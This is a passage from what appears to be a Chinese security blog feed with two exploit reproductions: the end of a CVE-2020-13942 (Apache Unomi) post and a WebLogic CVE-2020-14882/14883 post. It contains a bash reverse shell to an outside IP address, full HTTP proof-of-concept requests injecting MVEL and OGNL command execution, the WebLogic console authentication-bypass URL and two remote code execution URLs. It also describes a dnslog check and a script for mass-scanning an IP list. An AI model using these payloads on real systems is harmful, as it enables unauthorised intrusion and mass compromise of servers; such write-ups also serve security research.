<p>服务端直接执行命令可以成功</p>
<p>但是执行sh文件 会报错</p>
<p>  <strong>sh: 1: Syntax error: Bad fd number</strong></p>
<p><img src="/images/cve-2020-13942/Untitled%2010.png" alt="/images/cve-2020-13942/Untitled%2010.png"></p>
<p>这边主要原因是 sh sh文件  默认是以dash执行的（linux shell的一种类型）</p>
<hr>
<p><a href="https://blog.csdn.net/weixin_39212776/article/details/81079727">https://blog.csdn.net/weixin_39212776/article/details/81079727</a></p>
<p><strong>补充：LINUX shell</strong></p>
<pre><code>**linux中程序解释命令后通过内核与计算机硬件交流。  而使用者则是通过shell与系统内核进行交流**
</code></pre>
<p><strong>shell是一个处理用户请求的接口 负责解释输入命令调用用户希望使用的程序</strong></p>
<pre><code>**Shell Script** 
</code></pre>
<p><strong>是针对shell写的脚本 （.sh）批量处理命令</strong></p>
<p><strong>Bash 和 Dash</strong> </p>
<p> <strong>两者都是shell的不同类型 遵从不同的规则</strong></p>
<p><strong>而反弹shell的命令要以bash执行</strong></p>
<p><strong>sh 使用的是dash执行</strong></p>
<p><strong>bash 使用bash执行</strong></p>
<hr>
<p>解决方案</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>将运行命令改为bash</span><br><span class="line">bash she11.sh</span><br><span class="line">(命令为sh就算加了注释也会以sh执行)</span><br><span class="line"><span class="number">2.</span>在sh文件中第一行加入注释</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">119.3</span><span class="number">.173</span><span class="number">.27</span>/<span class="number">2333</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">然后运行方式改为 ./she11.sh </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这边执行命令</p>
<p><img src="/images/cve-2020-13942/Untitled%2011.png" alt="/images/cve-2020-13942/Untitled%2011.png"></p>
<p>攻击端成功收到返回的shell</p>
<p><img src="/images/cve-2020-13942/Untitled%2012.png" alt="/images/cve-2020-13942/Untitled%2012.png"></p>
<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><hr>
<p>POC1（MVEL）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /context.json HTTP/<span class="number">1.1</span></span><br><span class="line">Host: IP:<span class="number">8181</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 493</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    &quot;filters&quot;: [</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            &quot;id&quot;: &quot;sample&quot;,</span></span><br><span class="line"><span class="comment">            &quot;filters&quot;: [</span></span><br><span class="line"><span class="comment">                &#123;</span></span><br><span class="line"><span class="comment">                    &quot;condition&quot;: &#123;</span></span><br><span class="line"><span class="comment">                         &quot;parameterValues&quot;: &#123;</span></span><br><span class="line"><span class="comment">                            &quot;&quot;: &quot;script::Runtime r = Runtime.getRuntime(); r.exec(\&quot;要执行的命令\&quot;);&quot;</span></span><br><span class="line"><span class="comment">                        &#125;,</span></span><br><span class="line"><span class="comment">                        &quot;type&quot;: &quot;profilePropertyCondition&quot;</span></span><br><span class="line"><span class="comment">                    &#125;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">            ]</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    ],</span></span><br><span class="line"><span class="comment">    &quot;sessionId&quot;: &quot;sample&quot;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>

<p>POC2（ONGI）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /context.json HTTP/<span class="number">1.1</span></span><br><span class="line">Host: IP:<span class="number">8181</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 1066</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  &quot;personalizations&quot;:[</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      &quot;id&quot;:&quot;gender-test&quot;,</span></span><br><span class="line"><span class="comment">      &quot;strategy&quot;:&quot;matching-first&quot;,</span></span><br><span class="line"><span class="comment">      &quot;strategyOptions&quot;:&#123;</span></span><br><span class="line"><span class="comment">        &quot;fallback&quot;:&quot;var2&quot;</span></span><br><span class="line"><span class="comment">      &#125;,</span></span><br><span class="line"><span class="comment">      &quot;contents&quot;:[</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">          &quot;filters&quot;:[</span></span><br><span class="line"><span class="comment">            &#123;</span></span><br><span class="line"><span class="comment">              &quot;condition&quot;:&#123;</span></span><br><span class="line"><span class="comment">                &quot;parameterValues&quot;:&#123;</span></span><br><span class="line"><span class="comment">                  &quot;propertyName&quot;:&quot;(#runtimeclass = #this.getClass().forName(\&quot;java.lang.Runtime\&quot;)).(#getruntimemethod = #runtimeclass.getDeclaredMethods().&#123;^ #this.name.equals(\&quot;getRuntime\&quot;)&#125;[0]).(#rtobj = #getruntimemethod.invoke(null,null)).(#execmethod = #runtimeclass.getDeclaredMethods().&#123;? #this.name.equals(\&quot;exec\&quot;)&#125;.&#123;? #this.getParameters()[0].getType().getName().equals(\&quot;java.lang.String\&quot;)&#125;.&#123;? #this.getParameters().length &lt; 2&#125;[0]).(#execmethod.invoke(#rtobj,\&quot;要执行的命令\&quot;))&quot;,</span></span><br><span class="line"><span class="comment">                  &quot;comparisonOperator&quot;:&quot;equals&quot;,</span></span><br><span class="line"><span class="comment">                  &quot;propertyValue&quot;:&quot;male&quot;</span></span><br><span class="line"><span class="comment">                &#125;,</span></span><br><span class="line"><span class="comment">                &quot;type&quot;:&quot;profilePropertyCondition&quot;</span></span><br><span class="line"><span class="comment">              &#125;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">          ]</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">      ]</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">  ],</span></span><br><span class="line"><span class="comment">  &quot;sessionId&quot;:&quot;sample&quot;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>weblogic未授权命令执行复现+脚本制作（CVE-2020-14882-14883）</title>
    <url>/2021/03/20/weblogic%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0-%E8%84%9A%E6%9C%AC%E5%88%B6%E4%BD%9C%EF%BC%88CVE-2020-14882-14883%EF%BC%89/</url>
    <content><![CDATA[<p>之前复现的部分之前好像没有写。。。就从网上找点吧</p>
<p>cve编号 CVE-2020-14882-14883</p>
<p>影响版本</p>
<p>Oracle:Weblogic:</p>
<p>10.3.6.0.0</p>
<p>12.1.3.0.0</p>
<p>12.2.1.3.0</p>
<p>12.2.1.4.0</p>
<p>14.1.1.0.0</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>vulhub已经收录 从github下载下来直接一键搭建环境</p>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="14882"><a href="#14882" class="headerlink" title="14882"></a>14882</h3><p>管理地址</p>
<p><a href="http://192.168.207.149:7001/console">http://192.168.207.149:7001/console</a></p>
<p>未授权访问</p>
<p><a href="http://192.168.207.149:7001/console/css/%252e%252e%252fconsole.portal">http://192.168.207.149:7001/console/css/%2e%2e%2fconsole.portal</a></p>
<p>低权限的用户访问以下URL，通过未授权访问到管理后台页面</p>
<h3 id="14883"><a href="#14883" class="headerlink" title="14883"></a>14883</h3><p>刷新页面使用burp抓包</p>
<p>exp有两种 </p>
<p>get （版本10.3.6.0不可用）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//&quot;+ip+&quot;/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#x27;&quot;+bash+&quot;&#x27;);&quot;)</span></span><br></pre></td></tr></table></figure>

<p>包含远程xml  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//&quot;+attack_ip+&quot;/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(%22&quot;+remote_xml_location+&quot;%22)</span></span><br></pre></td></tr></table></figure>

<h1 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h1><p>当时主逻辑写的还是比较乱的</p>
<p>主要分为</p>
<p>验证模块</p>
<p>RCE模块</p>
<p>验证模块首先是进行出网验证 使用dnslog</p>
<p>主要是这两个函数 获取一个COOKIE 同时包里还会返回给你验证的网址</p>
<p>代入漏洞里用ping/curl等执行命令</p>
<p>再用dnscheck方法 查看返回包内容 有记录则为验证成功</p>
<p><img src="/images/cve-2020-14883/Untitled.png" alt="/images/cve-2020-14883/Untitled.png"></p>
<p>然后就可以进入RCE模块</p>
<p>其实就是一个没有回显的命令行…………</p>
<p>关于批量验证方式</p>
<p>打开IP.TXT 遍历每个IP</p>
<p>在原有的代码上套上一个循环依次代入验证（这个时候要把RCE模块去掉）</p>
<p>详细代码已经上传gayhub</p>
<p><strong>单个验证</strong></p>
<p><img src="/images/cve-2020-14883/1616228306553.jpeg" alt="/images/cve-2020-14883/1616228306553.jpeg"></p>
<p>批量</p>
<p><img src="/images/cve-2020-14883/1616228311205.jpeg" alt="/images/cve-2020-14883/1616228311205.jpeg"></p>
]]></content>
  </entry>
</search>
